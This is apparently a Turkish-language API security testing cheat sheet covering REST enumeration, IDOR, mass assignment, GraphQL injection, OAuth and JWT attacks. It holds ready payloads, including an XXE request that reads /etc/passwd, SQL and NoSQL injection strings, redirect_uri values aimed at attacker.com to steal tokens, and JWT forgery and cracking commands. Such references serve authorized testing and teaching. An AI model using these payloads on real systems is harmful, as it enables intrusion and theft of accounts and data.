# 🔌 API Güvenlik Testi Başvuru Kılavuzu

[🇬🇧 English](../../README.md) • [🇮🇹 Versione Italiana](README.it.md)

```
   █████╗ ██████╗ ██╗    ███████╗███████╗ ██████╗██╗   ██╗██████╗ ██╗████████╗██╗   ██╗
  ██╔══██╗██╔══██╗██║    ██╔════╝██╔════╝██╔════╝██║   ██║██╔══██╗██║╚══██╔══╝╚██╗ ██╔╝
  ███████║██████╔╝██║    ███████╗█████╗  ██║     ██║   ██║██████╔╝██║   ██║    ╚████╔╝ 
  ██╔══██║██╔═══╝ ██║    ╚════██║██╔══╝  ██║     ██║   ██║██╔══██╗██║   ██║     ╚██╔╝  
  ██║  ██║██║     ██║    ███████║███████╗╚██████╗╚██████╔╝██║  ██║██║   ██║      ██║   
  ╚═╝  ╚═╝╚═╝     ╚═╝    ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝      ╚═╝   
```

<p align="center">
  <img src="https://img.shields.io/badge/API-Güvenlik-blue?style=for-the-badge" alt="API">
  <img src="https://img.shields.io/badge/REST-Testleri-green?style=for-the-badge" alt="REST">
  <img src="https://img.shields.io/badge/GraphQL-Kılavuzu-red?style=for-the-badge" alt="GraphQL">
</p>

---

## 📋 İçindekiler

- [OWASP API Top 10](#-owasp-api-top-10)
- [REST API Testleri](#-rest-api-testleri)
- [GraphQL Testleri](#-graphql-testleri)
- [Kimlik Doğrulama Saldırıları](#-kimlik-doğrulama-saldırıları)
- [JWT Saldırıları](#-jwt-saldırıları)
- [Yaygın Zafiyetler ve Atlatma](#-yaygın-zafiyetler-ve-atlatma)
- [Kullanılan Araçlar ve Kaynaklar](#-kullanılan-araçlar-ve-kaynaklar)

---

## 🔴 OWASP API Top 10

| # | Zafiyet Adı | Açıklama |
|---|-------------|----------|
| 1 | **BOLA** | Nesne Düzeyinde Bozuk Yetkilendirme (Broken Object Level Authorization) |
| 2 | **Broken Authentication** | Hatalı veya Atlatılabilir Kimlik Doğrulama |
| 3 | **BOPLA** | Nesne Özelliği Düzeyinde Bozuk Yetkilendirme (Mass Assignment / Fazla Veri) |
| 4 | **Unrestricted Resource Consumption** | Hız Limiti (Rate Limit) ve Kaynak Tüketim Sınırı Olmaması |
| 5 | **BFLA** | Fonksiyon Düzeyinde Bozuk Yetkilendirme (Broken Function Level Auth) |
| 6 | **SSRF** | Sunucu Taraflı İstek Sahteciliği (Server-Side Request Forgery) |
| 7 | **Security Misconfiguration** | Güvenlik Yapılandırma Hataları ve Hata Mesajları |
| 8 | **Lack of Protection** | İş Akışı ve Otomasyon Koruması Eksikliği |
| 9 | **Improper Assets Management** | Eski (v1, v2) veya Unutulmuş Test API'lerinin Açıkta Kalması |
| 10 | **Unsafe API Consumption** | Güvensiz Üçüncü Parti API Entegrasyonları |

---

## 🌐 REST API Testleri

### Keşif ve Numaralandırma (Discovery & Enumeration)

```bash
# FFUF ile API uç noktalarını (endpoints) bulma
ffuf -u https://api.target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt

# Sürüm numaralandırması (Eski sürümlerde güvenlik kontrolleri eksik olabilir)
/api/v1/users
/api/v2/users
/api/v3/users
/api/beta/users
/api/latest/users

# Sık karşılaşılan dokümantasyon ve API yolları
/api/
/api/v1/
/api/v2/
/rest/
/graphql
/swagger/
/openapi.json
/api-docs
/swagger.json
/swagger-ui/
/docs/
```

### HTTP Metotları Testi (HTTP Methods)

```bash
# Tüm metotları deneyin (Bazen GET engelliyken POST veya PUT çalışabilir)
curl -X GET https://api.target.com/users/1
curl -X POST https://api.target.com/users
curl -X PUT https://api.target.com/users/1
curl -X PATCH https://api.target.com/users/1
curl -X DELETE https://api.target.com/users/1
curl -X OPTIONS https://api.target.com/users

# Metot geçersiz kılma (Method Override Başlıkları)
curl -X POST -H "X-HTTP-Method-Override: DELETE" https://api.target.com/users/1
curl -X POST -H "X-Method-Override: PUT" https://api.target.com/users/1
```

### Parametre Manipülasyonu

```bash
# BOLA / IDOR Testleri
GET /api/users/1      # Kendi ID değeriniz
GET /api/users/2      # Başka bir kullanıcının ID'si
GET /api/users/0
GET /api/users/-1
GET /api/users/999999

# Parametre Kirliliği (Parameter Pollution)
/api/users?id=1&id=2
/api/users?id[]=1&id[]=2

# Kodlama (Encoding) ve Atlatma Denemeleri
/api/users/1%00
/api/users/1%0a
/api/users/1%2e%2e%2f2
```

### Content-Type Saldırıları

```bash
# İstek Content-Type başlığını değiştirin
Content-Type: application/json
Content-Type: application/xml
Content-Type: application/x-www-form-urlencoded
Content-Type: text/xml
Content-Type: text/plain

# JSON bekleyen servise XML göndererek XXE tetikleme
curl -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user>&xxe;</user>' https://api.target.com/users
```

### Toplu Atama Zafiyeti (Mass Assignment)

```bash
# İstek gövdesine gizli alanlar ekleme
POST /api/users
{
  "username": "test",
  "email": "test@test.com",
  "role": "admin",           # Yönetici rolü eklemeyi deneyin
  "isAdmin": true,           # Yetki bayrağını ekleyin
  "balance": 99999,          # Bakiye alanını deneyin
  "verified": true           # Doğrulanmış hesap bayrağı
}

# Dizi (Array) yapıları kullanarak atlatma
{
  "user": {
    "name": "test",
    "role_ids": [1, 2, 3]
  }
}
```

---

## 📊 GraphQL Testleri

### Şema İnceleme (Introspection)

```graphql
# Tam şema introspection sorgusu
query {
  __schema {
    types {
      name
      fields {
        name
        args { name }
      }
    }
  }
}

# Basit şema dökümü
{__schema{types{name,fields{name}}}}

# Tanımlı tüm sorguları (Queries) listeleme
{__schema{queryType{fields{name,description}}}}

# Tanımlı tüm mutasyonları (Mutations) listeleme
{__schema{mutationType{fields{name,description}}}}
```

### Yaygın GraphQL Saldırıları

```graphql
# IDOR ile başka kullanıcının verisini çekme
query { user(id: 2) { email, password } }

# Toplu istek (Batching attack - Hız limitini aşmak için)
query {
  user1: user(id: 1) { email }
  user2: user(id: 2) { email }
  user3: user(id: 3) { email }
}

# İç içe sorgu ile Servis Dışı Bırakma (Nested Query DoS)
query {
  user(id: 1) {
    friends {
      friends {
        friends {
          name
        }
      }
    }
  }
}

# Hata mesajlarından alan tahmini (Field Suggestions)
{ user { a } }  # Sunucu "Did you mean 'account' or 'address'?" yanıtı dönebilir
```

### GraphQL İçinde SQL ve NoSQL Enjeksiyonu

```graphql
# Bağımsız değişkenlerde SQLi
query { user(name: "' OR '1'='1") { id } }
query { users(filter: "admin'--") { id } }

# NoSQL Enjeksiyonu
query { user(query: "{$gt: ''}") { id } }
```

### Kapatılmış Introspection'ı Atlatma

```graphql
# Alternatif şema sorgusu
query { __type(name: "User") { fields { name } } }

# ffuf ile GraphQL alan adlarını brute-force etme
```

---

## 🔐 Kimlik Doğrulama Saldırıları

### API Anahtarı (API Key) Testleri

```bash
# JS dosyalarından, mobil uygulamalardan veya GitHub'dan bulunan anahtarları farklı yerlerde deneyin:
curl -H "X-API-Key: ANAHTAR" https://api.target.com
curl -H "Authorization: Bearer ANAHTAR" https://api.target.com
curl -H "api-key: ANAHTAR" https://api.target.com
curl "https://api.target.com?api_key=ANAHTAR"
```

### OAuth 2.0 Saldırıları

```bash
# redirect_uri manipülasyonu ile token çalma
?redirect_uri=https://attacker.com
?redirect_uri=https://target.com.attacker.com
?redirect_uri=https://target.com%40attacker.com
?redirect_uri=https://target.com/callback/../../../attacker

# State parametresi atlatma:
# - State parametresini istekten tamamen silin
# - Başka bir kullanıcı için üretilen state değerini deneyin
```

### Oturum ve Token Yönetimi

```bash
# Çıkış (Logout) yapıldıktan sonra eski JWT / Bearer token geçerli kalıyor mu?
# Token rotasyonu düzgün yapılıyor mu?
# Aynı token farklı oturumlarda tekrar kullanılabiliyor mu?
```

---

## 🎫 JWT (JSON Web Token) Saldırıları

### JWT Çözümleme
```bash
# Linux CLI üzerinden Base64 dökümü
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." | cut -d'.' -f1 | base64 -d
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." | cut -d'.' -f2 | base64 -d
```

### Algoritma Karışıklığı (Algorithm Confusion)

```json
// Başlıktaki algoritmayı 'none' olarak değiştirin
{
  "alg": "none",
  "typ": "JWT"
}
// İmza kısmını silin (noktayı koruyun)
```

```bash
# HS256 <-> RS256 Saldırısı:
# Asimetrik genel anahtarı (Public Key) HMAC simetrik gizli anahtarı olarak kullanma
```

### İmza Atlatma ve Gizli Anahtar Kırma

```bash
# İmza kısmını tamamen silerek gönderme (Sondaki noktayı bırakın)
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.

# Zayıf HMAC gizli anahtarını Hashcat ile kırma
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# John the Ripper ile kırma
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256
```

### Hak Yükseltme (Claim Manipulation)

```json
// Token gövdesindeki verileri yönetici olarak değiştirip imzalama
{
  "sub": "1234567890",
  "name": "admin",
  "role": "admin",
  "admin": true,
  "exp": 9999999999
}
```

### JWT Otomasyon Araçları

```bash
# jwt_tool kullanımı
python3 jwt_tool.py <JWT>
python3 jwt_tool.py <JWT> -T                    # Otomatik kurcalama testleri
python3 jwt_tool.py <JWT> -C -d wordlist.txt   # Parola listesi ile gizli anahtar kırma
```

---

## 🐛 Yaygın Zafiyetler ve Atlatma

### Hız Sınırı (Rate Limiting) Atlatma

```bash
# IP başlıklarını değiştirerek istek gönderme
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Real-IP: 127.0.0.1

# Harf büyüklüğü varyasyonları
X-FORWARDED-FOR: 127.0.0.1

# URL varyasyonları
/api/login
/API/LOGIN
/api/Login
/api/login/
/api/login.json
```

### BFLA (Fonksiyon Düzeyinde Bozuk Yetkilendirme)

```bash
# Normal kullanıcı oturumunda admin uç noktalarına erişme
GET /api/admin/users
POST /api/admin/config
DELETE /api/admin/user/1

# Metot bazlı yetki kontrol eksikliği
GET /api/users     # Herkese açık
POST /api/users    # Yalnızca admin olmalı ama kontrol eksik olabilir
DELETE /api/users  # Doğrudan kullanıcı silme testi
```

---

## 🛠️ Kullanılan Araçlar ve Kaynaklar

| Araç | Kullanım Amacı |
|------|----------------|
| **Burp Suite** | API trafiği yakalama, Repeater ve Intruder testleri |
| **Postman / Insomnia** | API uç noktalarını manuel keşfetme ve koleksiyon yönetimi |
| **graphql-voyager** | GraphQL veri şemasını görselleştirme |
| **jwt_tool** | JWT imza atlatma, kırma ve sahtecilik testleri |
| **Arjun** | Gizli HTTP parametrelerini keşfetme |

---

<p align="center">
  <b>🔌 API'lerinizi Güvenli Hale Getirin!</b><br>
  <i>Yalnızca izin verilen sistemlerde test yapınız.</i>
</p>
